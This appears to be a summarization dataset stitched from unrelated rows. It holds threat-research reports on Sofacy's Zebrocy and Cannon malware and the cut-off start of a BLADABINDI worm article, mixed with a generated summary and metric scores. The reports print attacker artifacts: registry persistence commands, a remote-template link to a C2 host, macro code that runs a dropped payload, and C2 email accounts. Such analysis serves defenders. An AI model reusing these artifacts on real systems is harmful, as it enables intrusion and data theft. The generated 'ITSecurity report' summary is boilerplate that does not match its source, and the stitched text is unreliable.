with {System_Parametrs = 10} inside and creates the Windows registry entry:One screenshot of the victim's computer is taken under the name scx.bin and sent as an email attachment with SC (which probably stands for Screenshot) in the email's body.After dispatch, this malware connects to the kae.mezhnosh@post.cz mailbox via POP3 over SSL (port 995) and looks for messages with a Subject: that corresponds to its own id. If there is such a message and the body is not empty, the malware hex decodes it and then sends a message with okey in the body to sym777.g@post.cz. The content of the email previously retrieved is cleaned and parsed as below:string[] strArray = this._adr.Replace(""B&"", """").Replace(""Db"", """").Split('%'), string str1 = strArray[0], string str2 = strArray[1], 1 2 3 string [ ] strArray = this . _adr . Replace ( ""B&"" , """" ) . Replace ( ""Db"" , """" ) . Split ( '%' ) , string str1 = strArray [ 0 ] , string str2 = strArray [ 1 ] ,Two strings are obtained: the first one is a password and the second is a username for an email address.These new credentials are used to connect to the specified inbox freshly collected, and to also look there for a message with a subject that matches the malware's id as well as an attachment with the string audev in its filename. If both conditions are met, the malware saves the attachment and deletes the message from the server.All logging messages are sent to sym777.g@post.cz while messages retrieved via POP3 come from credentials recently obtained.These decisions from the operators make forensics more difficult. First, if you have the downloader with emails, you can't connect to the mailbox that contains the next stage.Second, if you retrieve the email credentials, you still can't get the next payload because it was deleted after retrieval.Once the downloader successfully writes the attachment to disk, it sends an email with okey2 in the body and an attachment, named l.txt, containing 090. The same file is overwritten with 000 and the malware tries to retrieve another message. Again - if it works - the l.txt file is sent with body text of okey3. The content of the attachment is a directory and a filename. The malware moves the audev file to this filepath. Finally, the malware sends an email with a body message of okey4 and l.txt as attachment. It starts the executable -- audev.exe and checks in the list of processes to see if one of them contains the string audev.Process.Start(this.rn), foreach (Process process in Process.GetProcesses()) { if (process.ProcessName.Contains(""audev"")) } 1 2 3 4 5 Process . Start ( this . rn ) , foreach ( Process process in Process . GetProcesses ( ) ) { if ( process . ProcessName . Contains ( ""audev"" ) ) }If a process with such a name is found, it sends a last email with okey5 as the body message and l.txt as the attachment. Finally, it deletes l.txt and set.txt, deletes the Windows registry key it created, and exits.Delphi mail downloaderThe main role of this downloader is to assess the importance of the compromised system and, if it is deemed important enough, to download and execute Zebrocy's last downloader.The binary is written in Delphi and packed with UPX. The complete definition of the TForm1 object can be found in its resource section and contains some configuration parameters used by the malware. The following sections focus on the initialization, capabilities, and network protocol of the downloader.InitializationAt the beginning, it decrypts a bunch of strings that are email addresses and passwords. The operator uses the AES ECB encryption algorithm. Each string is hex-encoded, with the first four bytes corresponding to the final size of the decrypted string (the decrypted strings may contain some padding at the end). There are two AES keys in the TForm1 object, the first one is used to encrypt data while the second is used to decrypt.Emails and passwords are used by the operator to send commands to the malware and also to retrieve information harvested from the victim's computer. The communication protocols are SMTP and POP3 - both of them over SSL. To use OpenSSL, the malware drops and uses two OpenSSL dynamic link libraries (DLLs): libeay32.dll (98c348cab0f835d6cf17c3a31cd5811f86c0388b) and ssleay32.dll (6d981d71895581dfb103170486b8614f7f203bdc).Notice that all files are dropped in the malware's working directory, C:\Users\Public\The persistence is done during the first execution of the malware using a well-known technique, the ""Logon scripts"". It creates a script file registration.bat and writes several strings from the TForm1 object. The final script is:reg add HKCU\Environment /v ""UserInitMprLogonScript"" /t REG_EXPAND_SZ /d ""C:\Users\Public\Videos\audev.exe"" /f del C:\Users\Public\Videos\registr.bat exit 1 2 3 reg add HKCU \ Environment / v ""UserInitMprLogonScript"" / t REG_EXPAND_SZ / d ""C:\Users\Public\Videos\audev.exe"" / f del C : \ Users \ Public \ Videos \ registr . bat exitLast but not least, the malware creates an id, in the same way as seen in previous Zebrocy binaries. It retrieves the UserName via the GetUserNameW Windows API and prepends the volume serial number of the C:\ drive.CapabilitiesWhile there are some conditions and order in the execution flow to collect information about the victim, the following section describes different gathering capabilities. The scan configuration is stored in the TForm1 object, grouped under seven different possibilities for retrieving information from the victim's computer.Starting with a simple scan, the first information that the malware can collect is related to files with the following extensions: .docx, .xlsx, .pdf, .pptx, .rar, .zip, .jpg, .bmp, .tiff. For each file found on the disk, it retrieves the full path and the last modified date of the file. That information is encrypted using the AES key mentioned earlier and stored in the file 0.txt. Another scan targets the extensions .dat, .json, .db and like the previous scan it retrieves the full path and last modified date of the file. Then it encrypts them and it stores it under the file 57.txt.Listing running processes is also one of the capabilities of this malware and it stores that information in the 08.txt file, and this looks like the listing below:======Listing_of_processes======= [System Process] System smss.exe csrss.exe wininit.exe csrss.exe winlogon.exe services.exe lsass.exe [...] 1 2 3 4 5 6 7 8 9 10 11 === === Listing_of_processes === === = [ System Process ] System smss . exe csrss . exe wininit . exe csrss . exe winlogon . exe services . exe lsass . exe [ ... ]In the file i.txt the malware gathers general information regarding the victim's computer as well as some information about the malware, like the version number and the path where it's executed, as shown below:v7.00 C:\Users\Public\Videos\audev.txt ============================================ Log_Drivers: C: fixed, size= 102297 Mb, free=83927 Mb S/N: [redacted] ================================================== OSV: Windows 7 WinType: 32 WinDir: C:\Windows Lang: English (United States) TZ: UTC1:0 Romance Standard Time HostN: [redacted]-PC User: [redacted] ===============S_LIST===================== C:\Program Files\Common Files C:\Program Files\desktop.ini C:\Program Files\DVD Maker C:\Program Files\Internet Explorer C:\Program Files\Microsoft.NET C:\Program Files\MSBuild C:\Program Files\Reference Assemblies C:\Program Files\Uninstall Information C:\Program Files\Windows Defender [...] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 v7 . 00 C : \ Users \ Public \ Videos \ audev . txt === === === === === === === === === === === === === === == Log_Drivers : C : fixed , size = 102297 Mb , free = 83927 Mb S / N : [ redacted ] === === === === === === === === === === === === === === === === == OSV : Windows 7 WinType : 32 WinDir : C : \ Windows Lang : English ( United States ) TZ : UTC1 : 0 Romance Standard Time HostN : [ redacted ] - PC User : [ redacted ] === === === === === S_LIST === === === === === === === C : \ Program Files \ Common Files C : \ Program Files \ desktop . ini C : \ Program Files \ DVD Maker C : \ Program Files \ Internet Explorer C : \ Program Files \ Microsoft . NET C : \ Program Files \ MSBuild C : \ Program Files \ Reference Assemblies C : \ Program Files \ Uninstall Information C : \ Program Files \ Windows Defender [ ... ]The malware is capable of taking screenshots, which are stored as 2\[YYYY-mm-dd HH-MM-SS]-Image_001.jpg, and generates another file 2\sa.bin, populated with the path listing of all screenshots taken. Its last capability is network enumeration, the output is found as 4.txt.Network ProtocolThe Delphi Mail Downloader is quite a new addition to Zebrocy's toolset and it features a new way to exfiltrate data and retrieve commands from the operator. The exfiltration is quite simple but very noisy on the network, as all the encrypted files gathered previously are sent over SMTPS and each version of the file is sent three times.Sender Recipient kevin30@ambcomission.com rishit333@ambcomission.com salah444@ambcomission.com rishit333@ambcomission.com karakos3232@seznam.cz antony.miloshevich128@seznam.czThe Subject: of the mail is the id of the victim and the file is sent as an attachment with a keyword corresponding to the file content. Notice that for each file there is an encrypted version of the file sent.files files encrypted keywords - 0.txt SCAN 57.txt 58.txt ACC 08.txt 082.txt PrL i.txt i2.txt SYS_INFO 4.txt 42.txt GET_NETWORKScreenshots taken and files matching both scans are sent as well but with different keywords.Content Keywords screenshots SC .docx, .xlsx, .pdf, .pptx, .rar, .zip, .jpg, .bmp, .tiff FILEs .dat, .json, .db D_ACCWhile the exfiltration uses SMTP, the binary connects to the email address tomasso25@ambcomission.com via POP3 and parses emails. The body of the email contains different keywords that are interpreted as commands by the malware.Keywords Purpose Log scan scan ldfile scan edit34 execute and delete pKL90 register isreg prlist process listing Start23 execute isr net40 enumerating network resources dele5 delete file isd dele6 delete directory isd cd25 create directory isc autodel delete itself Co55 copy file is_cp Mo00 move file is_mOnce executed, a debug log and the result of the command, if any, are sent back to the operator. For example, for a scan command, the operator receives a file that contains the list of files matching the scan extensions along with each matching file.While this downloader has some backdoor features, it drops a Delphi downloader already associated with the group, and described in our previous Zebrocy article.SummaryIn the past, we identified an overlap between Zebrocy and other traditional Sednit malware. We caught Zebrocy dropping XAgent, the Sednit flagship backdoor. Thus, we attribute Zebrocy to the Sednit group with high confidence.However, the analysis of these binaries shows some mistakes at the language level as well as development decisions that indicate a different maturity in the development of the toolset. Both downloaders are using mail protocols to exfiltrate information and share common mechanisms to gather the same information. Both are also very noisy on the network and on the system, as they create a lot of files and send a lot of them over the network. While analyzing the Delphi mail downloader, some features seem to have disappeared but some strings still remain the binary. Thus, while this toolset is being operated by the Sednit group, we are very confident that it is being developed by a different and less experienced team, as compared to those who develop the traditional Sednit components.Zebrocy components are fresh add-ons to the Sednit toolset, and the recent events might explain the increasing use of Zebrocy's binaries rather than the good old Sednit main malware.Indicators of Compromise (IoCs)Filename SHA-1 ESET detection SCANPASS_QXWEGRFGCVT_323803488900X_jpeg.exe 7768fd2812ceff05db8f969a7bed1de5615bfc5a Win32/Sednit.ORQ C:\Users\public\Pictures\scanPassport.jpg da70c54a8b9fd236793bb2ab3f8a50e6cd37e2df - C:\Users\Public\Documents\AcrobatReader.{exe,txt} a225d457c3396e647ffc710cd1edd4c74dc57152 MSIL/Sednit.D C:\Users\Public\Videos\audev.txt a659a765536d2099ecbde988d6763028ff92752e Win32/Sednit.CH %TMP%\Indy0037C632.tmp 20954fe36388ae8b1174424c8e4996ea2689f747 Win32/TrojanDownloader.Sednit.CMR %TMP%\Indy01863A21.tmp e0d8829d2e76e9bb02e3b375981181ae02462c43 Win32/TrojanDownloader.Sednit.CMQList of emailsEmails carl.dolzhek17@post.cz shinina.lezh@post.cz P0tr4h4s7a@post.cz carl.dolzhek17@post.cz sym777.g@post.cz kae.mezhnosh@post.cz tomasso25@ambcomission.com kevin30@ambcomission.com salah444@ambcomission.com karakos3232@seznam.cz rishit333@ambcomission.com antony.miloshevich128@seznam.czSign up to receive an email update whenever a new article is published in our Ukraine Crisis - Digital Security Resource Center Submit";### Instruction: The instruction is to summarize the ITSecurity report. ### Summary: The ITSecurity report provides an overview of the current state of IT security. It discusses the various threats to IT security, such as malware, phishing, ransomware, and other forms of cybercrime. It also provides advice on how to protect against these threats. The ITSecurity report summarizes the current state of ITSecurity in the organization. It discusses the importance of ITSecurity, the risks associated with it, and the measures that can be taken to mitigate those risks. The report also provides an overview of the current state of ITSecurity in the organization, including an assessment of the organization's ITSecurity policies and procedures. The ITSecurity report summarizes the current state of ITSecurity in the company. It provides an overview of the company's current ITSecurity measures, such as firewalls, antivirus software, and encryption. It also discusses the company's vulnerabilities, such as unpatched software and unsecured wireless networks. Finally, it provides recommendations for improving the company's ITSecurity measures. The output of the instruction is a description of the malware's behavior. [System Process] System smss.exe csrss.exe wininit.exe csrss.exe winlogon.exe services.exe lsass.exe [...] 1 2 3 4 5 6 7 8 9 10 11 === === ===;en;{'r': 0.04415011037527594, 'p': 0.5504587155963303, 'f': 0.08174386783505894};{'r': 0.014754098360655738, 'p': 0.27439024390243905, 'f': 0.028002488141682602};{'r': 0.04415011037527594, 'p': 0.5504587155963303, 'f': 0.08174386783505894}
https://unit42.paloaltonetworks.com/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan/;Sofacy Continues Global Attacks and Wheels Out New ‘Cannon’ Trojan;"This post is also available in: ??? (Japanese)In late October and early November 2018, Unit 42 intercepted a series of weaponized documents that use a technique to load remote templates containing a malicious macro. These types of weaponized documents are not uncommon but are more difficult to identify as malicious by automated analysis systems due to their modular nature. Specific to this technique, if the C2 server is not available at the time of execution, the malicious code cannot be retrieved, rendering the delivery document largely benign.The weaponized documents targeted several government entities around the globe, including North America, Europe, and a former USSR state. Fortunately for us, the C2 servers for several of these documents were still operational allowing for retrieval of the malicious macro and the subsequent payloads. Analysis revealed a consistent first-stage payload of the well-documented Zebrocy Trojan. Additional collection of related documents revealed a second first-stage payload that we have named 'Cannon'. Cannon has not been previously observed in use by the Sofacy group and contains a novel email-based C2 communication channel. Email as a C2 channel is not a new tactic, but it is generally not observed in the wild as often as HTTP or HTTPS. Using email as a C2 channel may also decrease the chance of detection, as sending email via non-sanctioned email providers may not necessarily construe suspicious or even malicious activity in many enterprises.The activity discussed in this blog revolves around two of the multitude of weaponized documents that we collected. These two documents shared multiple data artifacts, such as a shared C2 IP, shared author name, and shared tactics. Details of the extended attack campaign associated with the Cannon Trojan will be discussed in a later blog. A particularly interesting aspect of one of the two documents we analyzed was the filename used, crash list(Lion Air Boeing 737).docx. This is not the first instance of an adversary group using recent current events as a lure, but it is interesting to see this group attempt to capitalize on the attention of a catastrophic event to execute their attack.Attack DetailsThe initial sample we intercepted was a Microsoft Word document (SHA256: 2cfc4b3686511f959f14889d26d3d9a0d06e27ee2bb54c9afb1ada6b8205c55f) with the filename crash list(Lion Air Boeing 737).docx using the author name Joohn. This document appeared to be targeting a government organization dealing with foreign affairs in Europe via spear-phishing. Once the user attempts to open the document, Microsoft Word immediately attempts to load the remote template containing a malicious macro and payload from the location specified within the settings.xml.rels file of the DOCX document, as seen here:<Relationship Id=""rId1"" Type=""http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"" Target=""hxxp://188.241.58[.]170/live/owa/office.dotm"" TargetMode=""External""/> 1 < Relationship Id = ""rId1"" Type = ""http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"" Target = ""hxxp://188.241.58[.]170/live/owa/office.dotm"" TargetMode = ""External"" / >If the C2 has already been taken offline the document will still open, but Word will be unable to retrieve the remote template and thus Word will not load a macro. In this situation, Word will present the same lure document to the victim as seen in Figure 2, but without the ability to enable macros via an Enable Content button. Assuming the C2 is still operational however, Word loads the remote template (SHA256: f1e2bceae81ccd54777f7862c616f22b581b47e0dda5cb02d0a722168ef194a5) and the user is presented with the screen as seen in Figure 1.Figure 1 Lure screenOnce the victim presses the Enable content button, the embedded macro is executed. The macros used for these delivery documents use a less common method of using the AutoClose function. This is a form of anti-analysis as Word will not fully execute the malicious code until the user closes the document. If an automated sandbox exits its analysis session without specifically closing out the document, the sandbox may miss the malicious activity entirely. Once successfully executed, the macro will install a payload and save a document to the system. Typically, we expect to see a decoy document saved to the system and later displayed to make the victim less suspicious of malicious activity, however, in this case the document saved to the system was never displayed and does not contain any pertinent content to the Lion Air tragedy theme seen in the filename. The macro obtains the document saved to the system from within the document stored as UserForm1.Label1.Caption and will write it to:%TEMP%\~temp.docmThe macro obtains the payload saved to the system from within the document stored as UserForm1.Label2.Caption and will write it to:%APPDATA%\MSDN\~msdn.exeThe macro executes this payload in a rather interesting way by loading the dropped ~temp.docm document and calling a function within its embedded macro to run the payload. We believe the creator of this delivery document chose to run the payload from the dropped file as an evasion technique. Also, the fact the initial macro uses this dropped document for the execution of the payload may also explain why the document did not contain any decoy contents.To carry out this functionality, after writing the ~temp.docm and ~msdn.exe files to the system, the initial macro will load the ~temp.docm file as a Word Document object and attempts to run the function Proc1 in the Module1 macro within the ~temp.docm file, as seen in the following code snippet:Set WA = CreateObject(""Word.Application"") WA.Visible = False Set oMyDoc = WA.Documents.Open(vF) WA.Application.Run ""Module1.Proc1"" 1 2 3 4 Set WA = CreateObject ( ""Word.Application"" ) WA . Visible = False Set oMyDoc = WA . Documents . Open ( vF ) WA . Application . Run ""Module1.Proc1""The Proc1 function within the Module1 does nothing more than build the %APPDATA%\MSDN\~msdn.exe path to the dropped payload and executes it using the built-in Shell function, as seen in the following code snippet:vAdd = ""~msdn"" vFileName = Environ(""APPDATA"") & ""\MSDN\"" vFileName = vFileName + vAdd & "".e"" + ""x"" & ""e"" Shell vFileName 1 2 3 4 vAdd = ""~msdn"" vFileName = Environ ( ""APPDATA"" ) & ""\MSDN\"" vFileName = vFileName + vAdd & "" . e "" + "" x "" & "" e "" Shell vFileNameThe payload dropped to the system (SHA256: 6ad3eb8b5622145a70bec67b3d14868a1c13864864afd651fe70689c95b1399a) is a UPX packed Zebrocy variant written in the Delphi language. This variant of Zebrocy is functionally very similar to the Delphi-based payloads discussed in our previous publication on Sofacy attacks using Zebrocy earlier this year. The developer of this particular payload configured it to use the following URL to communicate with as its C2:hxxp://188.241.58[.]170/local/s3/filters.phpThe Zebrocy Trojan gathers system specific information that it will send to the C2 server via an HTTP POST request to the above URL. Like other Zebrocy samples, this Trojan collects system specific information it will send to the C2 server by running the command SYSTEMINFO & TASKLIST on the command line and by enumerating information about connected storage devices. This specific variant of Zebrocy will also send a screenshot of the victim host as a JPEG image to the C2 server. The C2 server will then provide a secondary payload to the beacon in ASCII hexadecimal representation, which the Trojan will decode and write to the following location:%APPDATA%\Roaming\Audio\soundfix.exeDuring our analysis, the C2 server provided a secondary payload that functionally appeared similar to the initial Zebrocy sample. The secondary payload was also written in Delphi and its developer configured it to communicate with its C2 server using HTTPS via the following URL:hxxps://200.122.181[.]25/catalog/products/books.phpNew Cannon TrojanWe were able to collect a second delivery document that shared the Joohn author from the crash list(Lion Air Boeing 737).docx document, as well as the 188.241.58[.]170 C2 IP to host its remote template. Structurally this sample was very similar to the initially analyzed document, but the payload turned out to be a completely new tool which we have named Cannon.The tool is written in C whose malicious code exists in a namespace called cannon, which is the basis of the Trojan's name. The Trojan functions primarily as a downloader that relies on emails to communicate between the Trojan and the C2 server. To communicate with the C2 server, the Trojan will send emails to specific email addresses via SMTPS over TCP port 587. The specific functions of Cannon can be seen in Table 1. This tool also has a heavy reliance on EventHandlers with timers to run its methods in a specific order and potentially increase its evasion capability.Function Description Timer (seconds) start_Tick Adds persistence and generates unique system specific identifier 1 inf_Tick Gathers system information 300 screen_Tick Takes a screenshot of the desktop 10 txt_Tick Logs into primary POP3 account and gets secondary POP3 account 120 load_Tick Logs into secondary POP3 account to download attachment to email 120 subject_Tick Logs into primary POP3 account to get path to for the downloaded attachment 120 run_Tick Moves the downloaded attachment to path and creates a process with attachment 60Table 1 Functions executed by Cannon and their purposeThe overall purpose of Cannon is to use several email accounts to send system data (system information and screenshot) to the threat actors and to ultimately obtain a payload from an email from the actors. The image in Figure 2, in addition to the following step-by-step process illustrates how Cannon communicates with the actor-controlled C2 email address to obtain a secondary payload:Figure 2 C2 process flow for CannonCannon gathers system information and saves it to a file named ini. The Trojan sends an email to sahro.bella7[at]post.cz with i.ini as the attachment, S_inf within the body and a subject with a unique system identifier via SMTPS from one of the following accounts: Bishtr.cam47Lobrek.chizhCervot.woprovCannon takes a screenshot and saves it to a file named ops. The Trojan sends an email to sahro.bella7[at]post.cz with sysscr.ops as the attachment, the string SCreen within the body and a subject with the unique system identifier via SMTPS from one of three previously used accounts. The actors likely log into sahro.bella7[at]post.cz and process the system information and screenshot sent by the Trojan to determine if the compromised host is of interest. If the actor wishes to download an additional payload to the compromised host, they will respond by sending emails in the following steps. The actor sends an email to trala.cosh2[at]post.cz with the unique system identifier as a subject with a secondary email account and credentials in ASCII hexadecimal format within the message body. This secondary email account is unknown at this time, so we will refer to it as ""secondary email account"" in future steps. The actor sends an email to the secondary email account with the unique system identifier as a subject with a secondary payload attached with a filename of txt. Cannon logs into the trala.cosh2[at]post.cz account via POP3S looking for emails with a subject that matches the unique system identifier. Cannon opens the email with the correct subject and decodes the hexadecimal data in the body of the message to obtain the secondary email account. Cannon acknowledges the receipt of the secondary email address by sending an email to sahro.bella7[at]post.cz with s.txt (contains {SysPar = 65} string) as the attachment, ok within the body and a subject with the unique system identifier via SMTPS from one of the three accounts from Step 1. The actor sends an email to trala.cosh2[at]post.cz with the unique system identifier as a subject with a file path that the Cannon Trojan will use to save the secondary payload. Cannon logs into the secondary email account via POP3S looking for emails with a subject that matches the unique system identifier. Cannon opens the email with the correct subject and saves the attachment named auddevc.txt. Cannon acknowledges the receipt of file download by sending an email to sahro.bella7[at]post.cz with l.txt (contains 090 string) as the attachment, ok2 within the body and a subject with the unique system identifier via SMTPS from one of the three accounts from Step 1. Cannon logs into the trala.cosh2[at]post.cz account via POP3S looking for emails with a subject that matches the unique system identifier. Cannon opens the email with the correct subject and decodes the hexadecimal data in the body of the message to obtain the file path that it will use to move the downloaded auddevc.txt file. Cannon acknowledges the receipt of file path by sending an email to sahro.bella7[at]post.cz with s.txt (contains {SysPar = 65} string) as the attachment, ok3 within the body and a subject with the unique system identifier via SMTPS from one of the three accounts from Step 1. Cannon moves the downloaded file to the specified path. Cannon acknowledges the successful move by sending an email to sahro.bella7[at]post.cz with l.txt (contains 090 string) as the attachment, ok4 within the body and a subject with the unique system identifier via SMTPS from one of the three accounts from Step 1. Cannon runs the downloaded file from the specified path. Cannon acknowledges the successful execution by sending an email to sahro.bella7[at]post.cz with s.txt (contains {SysPar = 65} string) as the attachment, ok5 within the body and a subject with the unique system identifier via SMTPS from one of the three accounts from Step 1.For a complete analysis of Cannon, please refer to the Appendix.ConclusionThe Sofacy threat group continues to target government organizations in the EU, US, and former Soviet states to deliver the Zebrocy tool as a payload. In these attacks, the delivery documents used to install Zebrocy used remote templates, which increases the difficulty to analyze the attack as an active C2 server is needed to obtain the macro-enabled document. The Sofacy group also leveraged the recent Lion Air disaster as a lure in one of these attacks, which continues to show a willingness to use current events in their social engineering themes.Of note, we also discovered the Sofacy group using a very similar delivery document to deliver a new Trojan called Cannon. Cannon uses SMTPS and POP3S as its C2 channel compared to Zebrocy that uses a more commonly observed HTTP or HTTPS based C2. This is not a new tactic but may be more effective at evading detection as the external hosts involved are a legitimate email service provider. Add the layer of encryption that the SMTPS and POP3S protocols provide to the legitimate web-based service and you have a very difficult C2 channel to blockWhile Sofacy's campaign delivering Zebrocy and Cannon remains active, Palo Alto Networks customers are protected from this threat in the following ways:AutoFocuscustomers can track these samples with the Zebrocy and Cannonand Cannon WildFiredetects the delivery documents, Zebrocy and Cannon payloads discussed in this blog with malicious verdicts.Traps blocks the macro-ladened remote templates as Suspicious macro detected, as well as Zebrocy and Cannon payloads as Suspicious executable detected.The IP addresses hosting remote templates and C2 services in these attacks are classified as Command and Control.Indicators of CompromiseDelivery Hashes2cfc4b3686511f959f14889d26d3d9a0d06e27ee2bb54c9afb1ada6b8205c55faf77e845f1b0a3ae32cb5cfa53ff22cc9dae883f05200e18ad8e10d7a8106392Remote Template Hashesf1e2bceae81ccd54777f7862c616f22b581b47e0dda5cb02d0a722168ef194a5fc69fb278e12fc7f9c49a020eff9f84c58b71e680a9e18f78d4e6540693f557dRemote Templateshxxp://188.241.58[.]170/live/owa/office.dotmZebrocy Hashes6ad3eb8b5622145a70bec67b3d14868a1c13864864afd651fe70689c95b1399aZebrocy C2 URLshxxp://188.241.58[.]170/local/s3/filters.phphxxps://200.122.181[.]25/catalog/products/books.phpCannon Hashes61a1f3b4fb4dbd2877c91e81db4b1af8395547eab199bf920e9dd11a1127221eCannon Email Accountssahro.bella7[at]post.cztrala.cosh2[at]post.czbishtr.cam47[at]post.czlobrek.chizh[at]post.czcervot.woprov[at]post.czAppendixThe Cannon Trojan is written in C and functions primarily as a downloader that relies on emails to communicate between the Trojan and the C2 server. To communicate with the C2 server, the Trojan will send emails to specific email addresses via SMTPS over TCP port 587. This tool uses a variety of functions that are run in a specific order to:Gather system information and a screenshotSend the gathered information to the actor via an emailCheck inbox for email from actor with payload attachedDownload payload attached to emailExecute downloaded payloadThe functions called to carry out these activities are as follows:start_TickThis function starts off by writing the string {SysPar = 65} to a file named s.txt, which will be used during C2 communications throughout the execution of this Trojan. This function is also responsible for creating persistence by writing the following to r.bat and executing it:REG ADD ""HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v Shell /t REG_SZ /d [path to wsslc.exe]It also creates a unique system specific identifier that it will use during the C2 communications to send and receive messages. The system specific identifier is a 16 character string that the Trojan creates using the serial number of the C volume and the first 4 hexadecimal bytes from Environment.UserName. The start_Tick function then begins the timer to run the inf_Tick method.inf_TickResponsible for gathering system information, which it then saves to the i.ini file:Application.ExecutablePathEnvironment.OSVersionEnvironment.SystemDirectoryEnvironment.UserDomainNameEnvironment.MachineNameEnvironment.UserNameTimeZone.CurrentTimeZone.StandardNameEnvironment.TickCountDriveInfo.GetDrives() - Name,VolumeLabel,DriveFormat,DriveType,TotalSize,AvailableFreeSpace,Serial numberFolders in C:\Program Files\Folders in C:\Program Files (x86)\Process.GetProcessesIt will use the aforementioned authentication credentials to log into the SMTP server to send the i.ini file to the C2 email address. The email sent to exfiltrate this information will have i.ini attached to it with the unique system identifier as the subject and S_inf within the body of the email message. The inf_Tick function then begins the timer to run the screen_Tick method.screen_TickTakes a screenshot of the desktop and saves it to a file named sysscr.ops. It will use the aforementioned authentication credentials to log into the SMTP server to send the sysscr.ops file to the C2 email address. The email sent to exfiltrate this information will have sysscr.ops file attached to it with the unique system identifier as the subject and SCreen within the body of the email message. The screen_Tick function then begins the timer to run the txt_Tick method.txt_TickThe Trojan will attempt to log into pop.seznam[.]cz over POP3s using the account name trala.cosh2[at]post.cz. If successful, the Trojan will access the messages in the inbox, specifically looking for any emails that have a subject that matches the unique system identifier. If an email exists, the Trojan will treat the email's body as hexadecimal format and save it to a variable that will be used by the load_Tick function. The Trojan will delete the email after reading and processing these emails.If the Trojan obtained the text from the email, it will use the aforementioned authentication credentials to log into the SMTP server to send the s.txt file to the C2 email address. The email sent to exfiltrate this information will have s.txt file attached to it with the unique system identifier as the subject and the string ok within the body of the email message. The txt_Tick function then begins the timer to run the load_Tick method.load_TickThe Trojan will first remove all occurrences of B& and Db from the text obtained from the email in the txt_Tick function. The Trojan will then split the remaining text on the % character and treat the content to the left of the % character as an account name and the content to the right as a password. The Trojan uses these credentials to log into another email account at pop.seznam[.]cz via POP3s, which it will check for email messages that have the unique system identifier as the subject. The Trojan will parse emails with the correct subject to obtain its attachments. The Trojan will save any attachments whose names contain the string auddevc to the system, which is meant to download a file named auddevc.txt. The Trojan will also create a file named l.txt that it will write the string 090 to.If the Trojan obtained the file from the email, it will use the aforementioned authentication credentials to log into the SMTP server to send the l.txt file to the C2 email address. The email sent to exfiltrate this information will have l.txt file attached to it with the unique system identifier as the subject and ok2 within the body of the email message. The load_Tick function then begins the timer to run the subject_Tick method.subject_TickThis function is very similar in functionality to the txt_Tick function. Just like the txt_Tick function, the Trojan will attempt to log into pop.seznam[.]cz over POP3s using the account name trala.cosh2@post[.]cz, again looking for subject of emails in the inbox that match the unique system identifier. The Trojan will then treat the body of the email as hexadecimal data that it will save to a variable that will be used by the run_Tick function. The contents saved to the variable should be the path in which the actor wishes the file saved in the load_Tick function to be moved to and run from.If the Trojan obtained the text from the email, it will use the aforementioned authentication credentials to log into the SMTP server to send the s.txt file to the C2 email address. The email sent to exfiltrate this information will have s.txt file attached to it with the unique system identifier as the subject and ok3 within the body of the email message. The subject_Tick function then begins the timer to run the run_Tick method.run_TickThe Trojan will first attempt to create the directory within the path obtained from the email in the subject_Tick function. It then attempts to move the auddevc.txt file downloaded in the load_Tick function to the newly created directory. If the file was successfully moved, the Trojan it will use the aforementioned authentication credentials to log into the SMTP server to send the l.txt file to the C2 email address. The email sent to exfiltrate this information will have l.txt file attached to it with the unique system identifier as the subject and ok4 within the body of the email message.The Trojan then attempts to create a process using the newly moved downloaded file. If the Trojan was able to successfully run the download file, it will use the aforementioned authentication credentials to log into the SMTP server to send the s.txt file to the C2 email address. The email sent to exfiltrate this information will have s.txt file attached to it with the unique system identifier as the subject and ok5 within the body of the email message. The Trojan would then delete the sysscr.ops screenshot file and the i.ini system information file before exiting.";"Cannon is a new variant of Zebrocy that uses emails to communicate between the Trojan and the C2 server. Cannon gathers system information and saves it to a file named ini. The Trojan sends an email to sahro.bella7[at]post.cz with i.ini as the attachment, S_inf within the body and a subject with a unique system identifier via SMTPS from one of the following accounts: Bishtr.cam47Lobrek.chizhCervot.woprovCannon takes a screenshot and saves it to a file named ops. The Trojan sends an email to sahro.bella7[at]post.cz with sysscr.ops as the attachment, the string SCreen within the body and a subject with the unique system identifier via SMTPS from one of three previously used accounts. The actors likely log into sahro.bella7[at]post.cz and process the system information and screenshot sent by the Trojan to determine if the compromised host is of interest. If the actor wishes to download an additional payload to the compromised host, they will respond by sending emails in the following steps. The actor sends an email to trala.cosh2[at]post.cz with the unique system identifier as a subject with a secondary email account and credentials in ASCII hexadecimal format within the message body. This secondary email account is unknown at this time, so we will refer to it as ""secondary email account"" in future steps. The actor sends an email to the secondary email account with the unique system identifier as a subject with a secondary payload attached with a filename of txt. Cannon logs into the trala.cosh2[at]post.cz account via POP3S looking for emails with a subject that matches the unique system identifier. Cannon opens the email with the correct subject and dec";en;{'r': 0.12882096069868995, 'p': 0.9915966386554622, 'f': 0.22801932163636965};{'r': 0.0916206261510129, 'p': 0.9754901960784313, 'f': 0.16750841593867974};{'r': 0.12882096069868995, 'p': 0.9915966386554622, 'f': 0.22801932163636965}
https://www.trendmicro.com/en_us/research/18/k/autoit-compiled-worm-affecting-removable-media-delivers-fileless-version-of-bladabindi-njrat-backdoor.html;AutoIt-Compiled Worm Sends Fileless BLADABINDI/njRAT;BLADABINDI, also known as njRAT/Njw0rm, is a remote access tool (RAT) with a myriad of backdoor capabilities -- from keylogging to carrying out distributed denial of service (DDoS) -- and has been rehashed and reused in various cyberespionage campaigns since it first emerged. Indeed, BLADABINDI's customizability and seeming availability in the underground make it a prevalent threat. Case in point: Last week, we came across a worm (detected by Trend Micro as Worm.Win32.BLADABINDI.AA) that propagates through removable drives and installs a fileless version of the BLADABINDI backdoor.While it is still unknown how the malicious file actually arrives in the infected system, its propagation routine suggests that it enters systems through removable drives. Apart from being a flexible and easy-to-use scripting language, BLADABINDI's use of AutoIt is notable. It uses AutoIt (the FileInstall command) to compile the payload and the main script into a single executable, which can make the payload -- the backdoor -- difficult to detect.Figure 1: Screenshot showing a common indicator of a compiled AutoIt script (highlighted)Technical analysisWe used an AutoIt script decompiler to break down the executable's AutoIt script and found that the script's main function first deletes any file named Tr.exe from the system's %TEMP% directory so it can install its own version of Tr.exe on it. The dropped file is executed after terminating any process with the same name. It will also drop a copy of itself in the same directory. For persistence, it adds a shortcut for the file at the %STARTUP% directory.For propagation, it installs a hidden copy of itself on any removable drive found on the infected system. It will also drop a shortcut file (.LNK) 